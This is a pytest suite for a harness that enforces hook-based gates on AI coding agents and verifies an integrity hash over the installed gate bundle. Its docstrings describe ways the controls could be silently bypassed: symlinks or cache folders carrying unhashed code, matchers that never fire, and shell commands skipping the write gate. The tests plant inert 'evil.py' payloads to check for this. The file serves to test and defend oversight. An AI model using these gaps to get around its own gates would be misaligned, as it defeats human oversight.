SHIPPED_TEXT_SUFFIXES = (".py", ".md", ".json", ".sh", ".ps1", ".yaml", ".yml", ".toml")


def _shipped_text_files():
    """Every text file the harness ships — the surface a person or an agent reads a command off."""
    for base in (TEAM_KITS, os.path.join(ROOT, "user")):
        for current, dirs, files in os.walk(base):
            dirs[:] = [d for d in dirs if d not in ("__pycache__", ".ruff_cache")]
            for name in sorted(files):
                if name.endswith(SHIPPED_TEXT_SUFFIXES):
                    yield os.path.join(current, name)


def _starts_the_kernel_cli(command):
    """Would the interpreter in this line RUN `kernel/cli.py`?

    The first non-option argument decides, the way the interpreter decides: `-m kernel.cli` names
    the module, and a path argument names it when it ends in `kernel/cli.py`. Anything else — a
    line that merely mentions the module, a line that runs the installed entry point — is a
    different command and a different question.
    """
    tokens = [token.strip("\"'`,;") for token in command.split()]
    for index, token in enumerate(tokens):
        base = os.path.basename(token.replace("\\", "/")).lower()
        if not re.fullmatch(r"(?:python[0-9.]*|py|pypy[0-9.]*)(?:\.exe)?", base):
            continue
        rest = tokens[index + 1:]
        while rest and rest[0].startswith("-") and rest[0] != "-m":
            rest.pop(0)
        if rest[:1] == ["-m"]:
            return rest[1:2] == ["kernel.cli"]
        return bool(rest) and rest[0].replace("\\", "/").lower().endswith("kernel/cli.py")
    return False


def test_every_written_down_kernel_cli_invocation_refuses_to_cache():
    """`python -m kernel.cli` is the entry point every fail-closed remedy names, and `-m` imports
    the whole package — into `.claude/kernel`, which `hook_bundle_hash` measures with nothing
    excluded. Without `-B` the diagnosis command destroys the trust it is diagnosing.

    THE SUBJECT IS EVERY PLACE THE COMMAND IS WRITTEN DOWN, not one of them. It appears in the
    CLI's own docstring and twice each in the global constitutions the entry gate follows before a
    kit is installed — and a line an agent copies out of a constitution is as executed as a line in
    settings.json. The line is only judged when it actually starts an interpreter
    (`_bytecode_is_disabled` answers None otherwise), so prose that merely mentions the module is
    not the subject.

    The three kits' `gate_write_scope` remedy used to be in here and is not any more: it named the
    module at a role who cannot import it (the kernel installs as `.claude/kernel`), so the remedy
    was rewritten to name the installed entry point instead of an invocation that fails.

    WHAT MAKES A LINE THE SUBJECT is that the interpreter would START this module — `_starts_the_
    kernel_cli`, which asks what the first non-option argument is. Selecting on "the line contains
    `kernel.cli`" was one word wider than the question and it went red on a comment that names the
    module while quoting the SHIM's command line; the shim is not this invocation and carries
    `sys.dont_write_bytecode` in its own first statements, which
    `test_the_evidence_the_merge_gate_demands_has_an_installed_producer` measures by running it and
    then looking in the hashed bundle."""
    offenders, invocations = [], []
    for path in _shipped_text_files():
        with open(path, encoding="utf-8", errors="ignore") as handle:
            for number, line in enumerate(handle, 1):
                if not _starts_the_kernel_cli(line) or _bytecode_is_disabled(line) is None:
                    continue
                where = "%s:%d %s" % (
                    os.path.relpath(path, ROOT).replace(os.sep, "/"), number, line.strip())
                invocations.append(where)
                if _bytecode_is_disabled(line) is False:
                    offenders.append(where)
    assert not offenders, (
        "these written-down kernel CLI invocations cache bytecode into the hashed bundle:\n"
        + "\n".join(offenders))
    # ...and the reason there is nothing to report is not that nothing was found. Five today: the
    # CLI's own docstring and two lines each in the two global constitutions.
    assert len(invocations) >= 5, "the scan found almost no invocations: %s" % invocations


def _documented_cli_invocations():
    """The interpreter invocations `kernel/cli.py` tells a reader to use, off its own docstring.

    The DOCUMENTATION is the subject, parsed as a docstring rather than grepped, because what makes
    this command dangerous is that people run what the module says to run.
    """
    with open(os.path.join(TEAM_KITS, "kernel", "cli.py"), encoding="utf-8") as handle:
        doc = ast.get_docstring(ast.parse(handle.read())) or ""
    found = re.findall(r"`([^`]*\bpython\b[^`]*-m kernel\.cli[^`]*)`", doc)
    assert found, "kernel/cli.py documents no interpreter invocation any more"
    return found


def test_the_documented_cli_invocation_leaves_the_bundle_alone(tmp_path):
    """RUNS WHAT THE DOCSTRING SAYS TO RUN, against a real installation.

    Measured before the fix, and it is worse than a stale hash: `python -m kernel.cli doctor`
    cached eleven `.pyc` into `.claude/kernel` and then reported, IN THE SAME RUN, that the bundle
    "changed after trust was recorded, and every gate now runs code the project never confirmed" —
    followed by `hooks_trust_required` at the next session. The one command every fail-closed
    remedy points at broke the installation and blamed the user. On Codex the inline verifier runs
    before each tool call, so the same keystroke blocks the session outright.

    Taking the command FROM the docstring is what keeps the two honest: a `-B` dropped from the
    documentation is a `-B` dropped from what this test runs, and the run then caches."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import hook_bundle_hash
    staging = _restamped_staging(tmp_path)
    repo = tmp_path / "repo"
    assert _install_from(staging, repo).returncode == 0
    claude = str(repo / ".claude")
    before = hook_bundle_hash(claude)
    assert _run_trust_hook(repo).returncode == 0
    assert _kit_state(repo)["state"] == "active"

    env = dict(os.environ, PYTHONPATH=claude)
    env.pop("PYTHONPYCACHEPREFIX", None)
    env.pop("PYTHONDONTWRITEBYTECODE", None)
    os.makedirs(str(repo / "project_memory"), exist_ok=True)
    for documented in _documented_cli_invocations():
        argv = [sys.executable if token.strip("`") == "python" else token.strip("`")
                for token in documented.split()]
        argv = [token for token in argv if not token.startswith("<")] + ["doctor"]
        proc = subprocess.run(argv, capture_output=True, text=True, cwd=str(repo), env=env)
        assert "changed after trust was recorded" not in (proc.stdout + proc.stderr), (
            "`%s` reported the bundle as tampered with in the same run that changed it:\n%s"
            % (documented, proc.stdout + proc.stderr))
        assert _bundle_bytecode(claude) == [], (
            "`%s` cached bytecode into the hashed bundle: %s"
            % (documented, _bundle_bytecode(claude)))
    assert hook_bundle_hash(claude) == before
    # ...and the consumer that would have withdrawn trust agrees, one session later.
    assert _run_trust_hook(repo).returncode == 0
    assert _kit_state(repo)["state"] == "active", (
        "a diagnosis run dropped the project to %s" % _kit_state(repo)["state"])


def test_a_tool_cache_in_the_source_kernel_never_reaches_an_installation(tmp_path):
    """The same hole as the kernel one, one directory deeper, and it survived that fix.

    `kit_hash` skipped `.ruff_cache`/`.mypy_cache`/`.pytest_cache` while both scaffolds copied the
    kernel with a plain recursive copy and pruned only bytecode. So a
    `team-kits/kernel/.ruff_cache/evil.py` was installed into `.claude/kernel`, counted as SHIPPED
    (hence no stranger), was blessed into the recorded bundle hash — and left every kit stamp
    byte-identical, so nothing had to be regenerated for it. Not importable today, which is why it
    is this test and not an exploit; the docstring of `kit_hash` said the opposite of it, which is
    why it is a defect either way.

    THE RESOLUTION IS THE PRUNE, NOT THE HASH. A cache directory is a leftover wherever it sits, so
    hashing it into a kit stamp would make every developer who ran ruff owe a bump; what had to
    change is that it never arrives in an installation, and that whatever DOES arrive is a stranger.
    Prune and shipped set therefore read one predicate (`is_transient`) and cannot disagree again.
    """
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import (_shipped_files, prune_transient, strangers_in_the_bundle)
    staging = _restamped_staging(tmp_path)
    write(str(staging / "kernel" / ".ruff_cache" / "evil.py"), "raise SystemExit(0)\n")
    assert not any(relative.startswith(".ruff_cache/")
                   for relative, _ in _shipped_files(str(staging / "kernel"), False)), (
        "the shipped set still demands a tool cache of the installation, so an install without one "
        "reads as modified and an install WITH one is blessed")

    installed = tmp_path / "bundle"
    shutil.copytree(str(staging / "kernel"), str(installed / "kernel"))
    write(str(installed / "hooks" / "_gate.py"), "pass\n")
    write(str(installed / "hooks" / "__pycache__" / "_gate.cpython-313.pyc"), "cached\n")
    prune_transient(str(installed / "hooks"), str(installed / "kernel"))
    assert not (installed / "kernel" / ".ruff_cache").exists(), (
        "the prune left a tool cache inside the enforcement bundle")
    assert not (installed / "hooks" / "__pycache__").exists()
    assert (installed / "kernel" / "hashing.py").is_file(), "the prune ate the bundle"

    # ...and one that appears afterwards is named rather than blessed
    write(str(installed / "kernel" / ".ruff_cache" / "evil.py"), "raise SystemExit(0)\n")
    named = strangers_in_the_bundle(str(installed), str(installed / "hooks"),
                                    str(staging / "kernel"))
    assert any("evil.py" in entry for entry in named), named


def test_both_scaffolds_prune_the_installed_bundle_through_the_kernel(tmp_path):
    """One prune, two callers — the property the shell twins could not have.

    The Windows half is measured for real in `test_the_scaffold_installs_the_kernel_the_hooks_import`
    and the POSIX half cannot run on this runner, so what is checked here is that they invoke the
    SAME implementation over the SAME two directories: a `kernel.hashing.prune_transient` call
    naming `.claude/hooks` and `.claude/kernel`. That is worth more than reading two prune loops,
    because it is what stops one platform from installing an importable `yaml.pyc` the other
    prunes. COMMENTS STRIPPED, so the paragraph above each call cannot satisfy the check."""
    for name in ("scaffold_team.sh", "scaffold_team.ps1"):
        with open(os.path.join(TEAM_KITS, name), encoding="utf-8") as handle:
            code = "\n".join(line for line in handle.read().splitlines()
                             if not line.lstrip().startswith("#"))
        # a shell continuation is one command, not two lines
        code = code.replace("\\\n", " ").replace("`\n", " ")
        call = [line for line in code.splitlines() if "prune_transient" in line]
        assert call, "%s no longer prunes the installed bundle through the kernel" % name
        joined = " ".join(call)
        assert ".claude/hooks" in joined.replace("\\", "/"), (name, joined)
        assert ".claude/kernel" in joined.replace("\\", "/"), (name, joined)
        # The interpreter is a shell variable the scaffold discovered, so what is read is the
        # option cluster between it and the `-c` payload: a prune that cached the kernel it is
        # cleaning would undo itself between its own last line and the recorder two steps later.
        assert re.search(r"(?<![\w-])-[A-Za-z]*B(?![\w-])", joined[:joined.index("-c")]), (
            "%s prunes bytecode with an interpreter that writes some: %s" % (name, joined))


def test_no_shipped_script_knows_about_only_some_tool_caches():
    """A place that knows tool caches exist must know about all of them.

    The bundle's four spellings of this idea are now one (`is_transient`), but the scaffolds still
    filter their `templates/repo` copy with a shell pattern of their own — a different subject, and
    one no python can reach from inside a `find`/`Get-ChildItem` expression. What can be enforced is
    the property that made the four dangerous: they DISAGREED, and the two that were short looked
    exactly as authoritative as the two that were complete. So any shipped script naming one cache
    directory must name every one `TRANSIENT_DIRS` holds; adding a fifth kind then fails loudly
    where it is incomplete instead of silently letting one through."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import TRANSIENT_DIRS
    caches = set(TRANSIENT_DIRS)
    subjects = []
    for path in sorted(globmodule.glob(os.path.join(TEAM_KITS, "*.py"))
                       + globmodule.glob(os.path.join(TEAM_KITS, "*.sh"))
                       + globmodule.glob(os.path.join(TEAM_KITS, "*.ps1"))
                       + globmodule.glob(os.path.join(TEAM_KITS, "kernel", "*.py"))
                       + [os.path.join(ROOT, "install.sh"), os.path.join(ROOT, "install.ps1")]):
        with open(path, encoding="utf-8") as handle:
            code = "\n".join(line for line in handle.read().splitlines()
                             if not line.lstrip().startswith("#"))
        named = {cache for cache in caches if cache in code}
        if not named:
            continue
        subjects.append(os.path.relpath(path, ROOT).replace(os.sep, "/"))
        assert named == caches, (
            "%s knows about %s but not %s — one incomplete copy of this list is how a "
            "`.ruff_cache` reached an installed enforcement bundle"
            % (subjects[-1], sorted(named), sorted(caches - named)))
    assert len(subjects) >= 2, "the scan found almost nothing: %s" % subjects


def _staging_copy_program(installer):
    """The python program `install.*` hands an interpreter to stage `team-kits/`.

    READ OUT OF THE INSTALLER, because what is under test is the copy the installer performs and
    not a restatement of it beside the installer. Both scripts spell it as `-c "<program>"` on one
    line, and both are comment-stripped first so a `-c` quoted in prose cannot be mistaken for the
    invocation.
    """
    with open(installer, encoding="utf-8") as handle:
        code = "\n".join(line for line in handle.read().splitlines()
                         if not line.lstrip().startswith("#"))
    found = re.findall(r'-c\s+"([^"]*copytree[^"]*)"', code)
    assert len(found) == 1, "%s: expected exactly one staging copy, found %d" % (installer,
                                                                                len(found))
    return found[0]


@pytest.mark.parametrize("installer", ("install.sh", "install.ps1"))
def test_the_installer_stages_no_tool_leftover(tmp_path, installer):
    """`~/.claude/team-kits` is the tree every scaffold copies an installation out of, so a leftover
    that reaches the staging reaches `.claude/kernel` next — the route by which a
    `team-kits/kernel/.ruff_cache/evil.py` was once installed, counted as shipped, and blessed into
    the recorded bundle hash.

    The installers now derive the rule from the tree they are staging
    (`kernel.hashing.transient_ignore_globs`) instead of carrying a list, and nothing executed that
    derivation: the installer tests all run with `--target codex`, which stages no kits at all.

    THE SUBJECT IS EVERY KIND OF LEFTOVER, derived from `TRANSIENT_DIRS`/`BYTECODE_SUFFIXES` rather
    than named here, so a fifth kind is covered on the day it is added. What is NOT measured is the
    shell around the invocation — that the installer reaches this line, and with these arguments;
    the program text is extracted from the script and run by this interpreter."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import TRANSIENT_DIRS, BYTECODE_SUFFIXES
    program = _staging_copy_program(os.path.join(ROOT, installer))

    # a real kernel, because the program imports the rule out of the tree it is copying
    source = tmp_path / "team-kits"
    shutil.copytree(os.path.join(TEAM_KITS, "kernel"), str(source / "kernel"),
                    ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
    write(str(source / "dev-team" / "hooks" / "gate_x.py"), "print(1)\n")
    leftovers = []
    for cache in sorted(TRANSIENT_DIRS):
        for relative in ("dev-team/hooks/%s/left.py" % cache, "kernel/%s/deep/left.py" % cache):
            leftovers.append(relative)
            write(str(source / relative.replace("/", os.sep)), "print(2)\n")
    for suffix in BYTECODE_SUFFIXES:
        leftovers.append("dev-team/hooks/gate_x" + suffix)
        write(str(source / "dev-team" / "hooks" / ("gate_x" + suffix)), "junk\n")

    stage = tmp_path / "stage"
    run = subprocess.run([sys.executable, "-B", "-c", program, str(source), str(stage)],
                         capture_output=True, text=True)
    assert run.returncode == 0, run.stdout + run.stderr
    staged = set()
    for current, _dirs, files in os.walk(str(stage)):
        for name in files:
            staged.add(os.path.relpath(os.path.join(current, name),
                                       str(stage)).replace(os.sep, "/"))
    assert "dev-team/hooks/gate_x.py" in staged, "the staging copied nothing at all"
    assert sorted(set(leftovers) & staged) == [], "tool leftovers reached the staging"


def test_the_project_memory_initializer_filters_directories_and_not_names(tmp_path):
    """One rule, two spellings, and only the meaning matters. The POSIX initializer excludes a path
    COMPONENT (`-path '*/__pycache__/*'`); the Windows one matched a regex against the whole path,
    so the two disagreed about everything that merely CONTAINS a cache name — a template called
    `notes__pycache__.yaml`, or any checkout living under a `.mypy_cache` directory. A template that
    is silently not installed produces no message anywhere; it surfaces weeks later as a file the PM
    cannot find.

    The completeness check beside this one (`test_no_shipped_script_knows_about_only_some_tool_
    caches`) sees both scripts and says nothing about meaning, which is how the divergence survived.
    RUN, NOT READ — but only the half this platform can execute; the other's semantics rest on its
    twin being run in CI."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import TRANSIENT_DIRS
    home = tmp_path / "home"
    template = home / ".claude" / "team-kits" / "demo-team" / "templates" / "project_memory"
    expected = {"a.yaml"}
    write(str(template / "a.yaml"), "x: 1\n")
    for cache in sorted(TRANSIENT_DIRS):
        write(str(template / cache / "left.yaml"), "leftover: true\n")   # under it: must not travel
        decoy = "notes%s.yaml" % cache                                   # named after it: must
        write(str(template / decoy), "decoy: true\n")
        expected.add(decoy)
    repo = tmp_path / "repo"
    repo.mkdir()
    if os.name == "nt":
        if not shutil.which("powershell"):
            pytest.skip("no powershell to run the Windows initializer with")
        command = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File",
                   os.path.join(TEAM_KITS, "init_project_memory.ps1"), "-Team", "demo-team"]
        env = dict(os.environ, USERPROFILE=str(home))
    else:
        if not shutil.which("bash"):
            pytest.skip("no bash to run the POSIX initializer with")
        command = ["bash", os.path.join(TEAM_KITS, "init_project_memory.sh"), "demo-team"]
        env = dict(os.environ, HOME=str(home))
    run = subprocess.run(command, cwd=str(repo), capture_output=True, text=True, env=env,
                         timeout=120)
    assert run.returncode == 0, run.stdout + run.stderr
    installed = set()
    for current, _dirs, files in os.walk(str(repo / "project_memory")):
        for name in files:
            installed.add(os.path.relpath(os.path.join(current, name),
                                          str(repo / "project_memory")).replace(os.sep, "/"))
    assert installed == expected


def test_a_directory_link_in_a_hashed_source_tree_makes_the_stamp_stale(tmp_path):
    """One directory, one answer — the property this module exists to hold, asked of `kit_hash`.

    `hook_bundle_hash` names a directory symlink instead of walking past it and carries that in its
    docstring as load-bearing; `kit_hash` kept the blind `os.walk` through the release that brought
    the kernel INTO the kit stamp. Measured before the fix: `team-kits/kernel/evil -> <elsewhere>`
    left all three stamps valid and contributed nothing, while the installed copy of the very same
    link was reported as a stranger by the very same module.

    Not an exploit — the recorder refuses further down — but `kit_hash` promises "everything a
    scaffold run reads or installs", and a tree that now points somewhere else is a different
    subject. BOTH HALVES of the walk are planted, because a shared tree is hashed into every kit and
    a kit's own tree into exactly one."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import kit_hash, recorded_kit_hash
    for planted, expected in ((os.path.join("kernel", "evil"), sorted(KITS)),
                              (os.path.join("dev-team", "skills", "evil"), ["dev-team"])):
        staging = _restamped_staging(tmp_path / planted.replace(os.sep, "_"))
        for kit in KITS:
            assert kit_hash(str(staging / kit)) == recorded_kit_hash(str(staging / kit)), kit
        target = tmp_path / (planted.replace(os.sep, "_") + "_target")
        write(str(target / "payload.py"), "SHADOWED = True\n")
        try:
            os.symlink(str(target), str(staging / planted), target_is_directory=True)
        except (OSError, NotImplementedError) as exc:
            pytest.skip("no privilege to create a directory symlink (%s); a junction cannot stand "
                        "in, os.path.islink() is False for one and the walk then descends" % exc)
        stale = sorted(kit for kit in KITS
                       if kit_hash(str(staging / kit)) != recorded_kit_hash(str(staging / kit)))
        assert stale == expected, (
            "a directory link at %s left these stamps valid: %s"
            % (planted, sorted(set(expected) - set(stale))))


def test_the_kit_stamp_derives_the_shared_half_instead_of_listing_it(tmp_path):
    """The answer to "a list missed `kernel/`" may not be a second list.

    `KIT_SHARED_FILES` named nine root files and missed the tree every gate imports; replacing it
    with `KIT_SHARED_FILES + KIT_SHARED_TREES` would leave the tenth root entry exactly as cheap to
    miss, and nothing in the repo compared either list against the directory. So the rule is now
    derived: everything at the `team-kits/` root that is not a kit (`is_kit_dir`) and not a tool
    leftover (`is_transient`) is shared input, hashed into every kit.

    Both shapes are planted, because the two used to be two enumerations."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import kit_hash, recorded_kit_hash
    for planted in ("a_new_root_script.py", os.path.join("a_new_root_tree", "payload.py")):
        staging = _restamped_staging(tmp_path / planted.replace(os.sep, "_"))
        for kit in KITS:
            assert kit_hash(str(staging / kit)) == recorded_kit_hash(str(staging / kit)), kit
        write(str(staging / planted), "print('shipped with every kit')\n")
        stale = [kit for kit in KITS
                 if kit_hash(str(staging / kit)) != recorded_kit_hash(str(staging / kit))]
        assert sorted(stale) == sorted(KITS), (
            "%s at the team-kits root left these kits' stamps valid: %s"
            % (planted, sorted(set(KITS) - set(stale))))


def test_the_kit_hash_separates_a_name_from_its_content(tmp_path):
    """Two different trees may not produce one byte stream — the property `hook_bundle_hash` states
    in its own docstring and `kit_hash` did not implement.

    A root file `ab` holding `c` and a root file `a` holding `bc` are different installations that
    concatenate to the same bytes, and the `@shared/<tree>/…` namespace only widened the set of
    cuts that collide. Delimiting is one NUL either side of the name."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import kit_hash
    hashes = []
    for name, content in (("ab", "c"), ("a", "bc")):
        staging = tmp_path / ("cut_" + name)
        _copy_kit_tree(TEAM_KITS, staging)
        write(str(staging / name), content)
        hashes.append(kit_hash(str(staging / "dev-team")))
    assert hashes[0] != hashes[1], (
        "two different shared halves hash the same — name and content are concatenated raw")


# -- step 9: nothing ships inert ----------------------------------------------

V2_GATES = ("gate_dispatch.py", "gate_approval.py", "gate_write_scope.py",
            "guard_memory_budget.py", "gate_push_token.py", "gate_shell_hygiene.py")


def registered_hooks(kit):
    """{hook filename: {event: {matchers}}} from a kit's shipped settings.

    Uses the KERNEL's `_invoked_scripts` rather than a second parse of the same strings. The first
    version took the last path segment of the command, which was a private re-implementation that
    agreed with doctor only by luck — and stopped agreeing the moment gates moved behind
    `_gate.py`: it read the whole tail `_gate.py" gate_dispatch.py` as one filename and reported
    every V2 gate as unregistered. Two readers of one format is the same defect as two hashes of
    one directory."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.report import _invoked_scripts
    path = os.path.join(TEAM_KITS, kit, "settings", "settings.json")
    data = json.load(open(path, encoding="utf-8"))
    wired = {}
    for event, entries in (data.get("hooks") or {}).items():
        for entry in entries:
            for hook in entry.get("hooks") or []:
                for name in _invoked_scripts(hook.get("command", "")):
                    wired.setdefault(name, {}).setdefault(event, set()).add(entry.get("matcher"))
    return wired


@pytest.mark.parametrize("kit", KITS)
def test_every_v2_gate_is_actually_wired(kit):
    """A gate that ships but is not REGISTERED enforces nothing, and the whole of steps 2-7 was
    inert until this wiring existed. `python scripts/harness.py doctor` reads the same file for the same reason —
    "the file exists" is the kind of evidence that made the ledger gate's first design wrong."""
    wired = registered_hooks(kit)
    missing = [name for name in V2_GATES if name not in wired]
    assert missing == [], "%s ships these gates without registering them: %s" % (kit, missing)


@pytest.mark.parametrize("kit", KITS)
def test_the_blocking_gates_are_on_a_blocking_event(kit):
    """Only PreToolUse can DENY a tool call. A gate whose job is refusal, registered on PostToolUse
    alone, is a log line — which is exactly what the ledger gate's first design turned out to be."""
    wired = registered_hooks(kit)
    for name in ("gate_dispatch.py", "gate_approval.py", "gate_write_scope.py",
                 "guard_memory_budget.py", "gate_push_token.py", "gate_shell_hygiene.py"):
        assert "PreToolUse" in wired.get(name, {}), "%s: %s has no PreToolUse registration" % (
            kit, name)


@pytest.mark.parametrize("kit", KITS)
def test_the_write_scope_gate_covers_both_doors(kit):
    """`state_write_protection` is two capabilities because it is two mechanisms: the file tools
    and the shell. Registering only the first is the state a project could previously read as
    "verified" while every shell command walked past it."""
    matchers = registered_hooks(kit).get("gate_write_scope.py", {}).get("PreToolUse", set())
    joined = " ".join(sorted(m or "" for m in matchers))
    assert "Edit" in joined, kit
    assert "Bash" in joined and "PowerShell" in joined, "%s: shell half not registered" % kit


@pytest.mark.parametrize("kit", KITS)
def test_the_dispatch_gate_sees_the_whole_spawn_lifecycle(kit):
    """Lease binding needs the events spike S3 identified: PreToolUse claims, SubagentStart binds
    by role, PostToolUse binds by the reported agentId, PostToolUseFailure rolls a failed claim
    back at once — and `Stop` is where a claim nobody ever reported on is reconciled.

    `Stop` replaced `PermissionDenied` here, and that is the point of the row rather than a
    cosmetic swap: the old pair of failure events was the only way back from a spent lease, and
    one of the two was measured never to fire. Stop needs no cooperation from the failing call —
    see `test_a_claim_whose_child_never_arrived_returns_the_task_to_ready_at_stop`.

    `SubagentStop` is the sixth, and it carries the other half of BUG-0058: the END of a child is
    an event delivered to nobody who acts on it, so it is recorded there and read at the lead's
    next turn-end. Without this registration `dispatch.idle_dispatches` has only its lease term
    left and the pilot's nine waiting turns pass unnoticed for a whole TTL —
    `test_the_turn_end_is_refused_for_a_dispatch_whose_child_stopped` is that chain."""
    events = set(registered_hooks(kit).get("gate_dispatch.py", {}))
    for event in ("PreToolUse", "SubagentStart", "PostToolUse", "PostToolUseFailure",
                  "SubagentStop", "Stop"):
        assert event in events, "%s: gate_dispatch missing %s" % (kit, event)


@pytest.mark.parametrize("kit", KITS)
def test_no_shipped_hook_reads_stdin_raw(kit):
    """An unbounded `json.load(sys.stdin)` buffers a payload of any size, which turns a hook from
    a decision into a memory event — and on a blocking gate, a hook that dies has not judged the
    call. `_compat.load` caps it at STDIN_LIMIT and then splits by ROLE: a gate exits 2 (it could
    not read its input, so it has not approved anything), a comfort hook takes the overflow
    sentinel, because refusing a tool call because a dashboard could not render would be absurd.

    Twelve hooks still parsed stdin directly when this test was written. Converting them by bulk
    regex broke five of them — the comfort hooks had a different try/except shape and the
    substitution left orphaned `except` blocks — which is why this asserts on the parsed SOURCE
    rather than on a text match: a syntactically broken hook must not be able to pass it."""
    import ast
    import glob
    offenders = []
    for path in sorted(glob.glob(os.path.join(TEAM_KITS, kit, "hooks", "*.py"))):
        source = open(path, encoding="utf-8").read()
        tree = ast.parse(source, filename=path)      # a broken file raises here, as it should
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            if (isinstance(func, ast.Attribute) and func.attr == "load"
                    and isinstance(func.value, ast.Name) and func.value.id == "json"
                    and node.args
                    and isinstance(node.args[0], ast.Attribute)
                    and node.args[0].attr == "stdin"):
                offenders.append("%s:%d" % (os.path.basename(path), node.lineno))
    assert offenders == [], "%s: unbounded stdin reads at %s" % (kit, offenders)


def test_an_unreadable_procedure_is_not_an_approved_one(tmp_path):
    """"We cannot tell" and "yes" are the same outcome only if you are willing to ship the
    difference. The V1 gate exited 0 on a corrupt registry and delegated to `guard_yaml_valid` —
    but that guard fires when the file is WRITTEN, not when a spawn is judged, so a store corrupted
    by any other route simply switched this gate off. Per-item files move the question rather than
    answering it: a `procedures/active/PROC-nnnn.yaml` that does not parse is a procedure whose
    approval cannot be read, and a work order naming it is refused for exactly that reason.

    Two refusals are measured here because they are different sentences: the whole store being
    unreadable leaves the project with NO approved procedure, and one unreadable file beside a good
    one leaves that one procedure unusable while the other still works.
    """
    pm = tmp_path / "project_memory"
    procedures = os.path.join(str(pm), "procedures", "active")
    os.makedirs(procedures, exist_ok=True)
    write(os.path.join(procedures, "PROC-0001.yaml"), "id: PROC-0001\n  status: [broken\n")
    payload = {"hook_event_name": "PreToolUse", "tool_name": "Agent", "cwd": str(tmp_path),
               "tool_input": {"subagent_type": "bookkeeper", "prompt": "execute PROC-0001"}}
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path), HARNESS_KERNEL_PATH=TEAM_KITS)
    result = subprocess.run(
        [sys.executable, os.path.join(OFFICE_HOOKS, "gate_proc_approved.py")],
        input=json.dumps(payload), capture_output=True, text=True, env=env, timeout=120)
    assert result.returncode == 2
    assert "no approved procedure" in result.stderr
    assert "request-approval scope" in result.stderr, "a fail-closed message carries its remedy"


@pytest.mark.parametrize("matcher,expected", [
    ("Task", "unverified"),          # covers half the class
    ("Agent", "unverified"),         # covers the other half
    ("Agent|Task", "verified"),      # covers it
    ("Ag", "unverified"),            # fires for NOTHING: Claude Code matches simple names exactly
    ("a", "unverified"),
    ("*", "verified"),
])
def test_a_matcher_must_cover_the_whole_tool_class_and_exactly(tmp_path, matcher, expected):
    """Two quantifier defects in one place, both re-creating the round-1 failure in a narrower
    spelling. `any` over the tool class meant `gate_dispatch` registered for `Task` alone read as
    a spawn veto while `Agent` spawns went unguarded. And treating every matcher as an unanchored
    REGEX meant `"Ag"` "covered" Agent — Claude Code matches a plain-word matcher exactly (with
    `|` as alternation), so such a registration fires for nothing at all and still read as
    enforcement."""
    result = doctor_of(tmp_path, wired=(("gate_dispatch.py", [("PreToolUse", matcher)]),),
                       kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    assert result["capabilities"]["spawn_veto"] == expected


@pytest.mark.parametrize("settings", [
    {"hooks": {"PreToolUse": [{"matcher": 7, "hooks": []}]}},
    {"hooks": {"PreToolUse": [{"matcher": ["Agent"], "hooks": []}]}},
    {"hooks": ["PreToolUse"]},
    {"hooks": {"PreToolUse": "nope"}},
    {"hooks": {"PreToolUse": ["nope"]}},
])
def test_doctor_survives_the_input_it_exists_to_diagnose(tmp_path, settings):
    """Three of these raised straight out of `doctor` — a `TypeError` from `re.compile` on an int,
    an unhashable list going into a set, and `.items()` on a list. Doctor is the tool of last
    resort, run precisely when a kit update half-finished or somebody hand-edited the file. It is
    the one program in the harness that must not die on bad input."""
    root = tmp_path / "proj"
    os.makedirs(str(root / "project_memory"), exist_ok=True)
    os.makedirs(str(root / ".claude" / "hooks"), exist_ok=True)
    write(str(root / ".claude" / "settings.json"), json.dumps(settings))
    sys.path.insert(0, TEAM_KITS)
    from kernel import report
    from kernel.state import ProjectState
    result = report.doctor(ProjectState(str(root / "project_memory")))
    assert result["enforcement"] == "audited"
    assert set(result["capabilities"].values()) == {"unverified"}


# -- round-5 fixes that no test could see fail (round-6 finding 6) -------------
#
# Round 6 mutated six changes from round 5 and four of them left the suite green: the code was
# right and nothing depended on it. Re-measured against this tree on 2026-07-27, after the lockstep
# had landed, the picture is better and still not good: the symlink yield, the enumeration
# `_hash_subtrees` delegates and `NotebookEdit` in the write gate DO go red now, but each only
# through a test written for something else — the Codex pin, the stranger scan, a hand-typed tool
# list — while the recorder's rc 2 was covered by nothing at all (full suite, 1353 passed with it
# mutated to 0). A property asserted only as somebody else's side effect moves the day that other
# test is rewritten, so what follows states each of them where it is defined. Every one was
# verified by putting the old behaviour back and watching the named test fail.


def _measured_bundle(claude, kit_source):
    """A minimal installed bundle plus the kit source it is compared against.

    Small on purpose: the shipped/measured pair is a statement about NAMES, and a fixture built
    from the real kit would drown one name disagreement in two hundred agreeing ones.
    """
    write(os.path.join(claude, "hooks", "gate_a.py"), "A = 1\n")
    write(os.path.join(claude, "kernel", "state.py"), "S = 1\n")
    write(os.path.join(kit_source, "hooks", "gate_a.py"), "A = 1\n")
    write(os.path.join(kit_source, "kernel", "state.py"), "S = 1\n")


def test_a_directory_link_in_the_bundle_is_named_by_the_hash_itself(tmp_path):
    """The headline fix of round 5, which for a whole release no test in the repo could see fail:
    nothing planted a link in a bundle until the Codex pin's fixture grew one.

    `os.walk` does not follow a directory symlink, so before the fix one was invisible to the
    hash - while Python imports through it perfectly well: `.claude/hooks/yaml -> <elsewhere>`
    owns the YAML parser of every gate process with the bundle hash unchanged and `hook_trust`
    still `verified`. The fix has two halves and both were uncovered: `_bundle_files` yields the
    link, and `_hash_subtrees` takes its enumeration from `_bundle_files` instead of walking on its
    own (while it walked itself, the scan saw the link and the hash did not - one directory, two
    answers). Each half alone makes the first assertion below false.

    NAMED, NOT FOLLOWED is the other half of the definition, and it is asserted as such: what the
    link points at may not enter the hash, or the measurement would depend on a tree outside the
    bundle and could be changed from there.
    """
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import hook_bundle_hash, strangers_in_the_bundle
